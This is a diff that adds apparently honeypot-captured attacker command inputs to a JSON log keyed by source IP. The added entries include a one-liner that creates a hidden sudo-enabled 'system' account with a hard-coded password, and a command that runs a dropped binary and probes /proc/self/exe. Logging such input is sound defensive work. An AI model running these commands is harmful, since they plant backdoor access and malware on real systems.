@@ -757,6 +757,28 @@
             "session": "35abd9dc3d03"
         }
     ],
+    "45.79.221.198": [
+        {
+            "timestamp": "2023-11-08T11:11:47.398206Z",
+            "event": "command_input",
+            "input": "apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 e28nTw6E) system && sudo usermod -aG sudo system && sudo usermod -aG sudo system",
+            "session": "238cbaa09316"
+        },
+        {
+            "timestamp": "2023-11-08T11:11:47.398643Z",
+            "event": "command_input",
+            "input": "openssl passwd -1 e28nTw6E",
+            "session": "238cbaa09316"
+        }
+    ],
+    "211.196.75.231": [
+        {
+            "timestamp": "2023-11-08T11:37:16.941837Z",
+            "event": "command_input",
+            "input": "./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;",
+            "session": "661c5534eb54"
+        }
+    ],
     "159.65.146.149": [
         {
             "timestamp": "2023-11-06T00:04:20.154859Z",
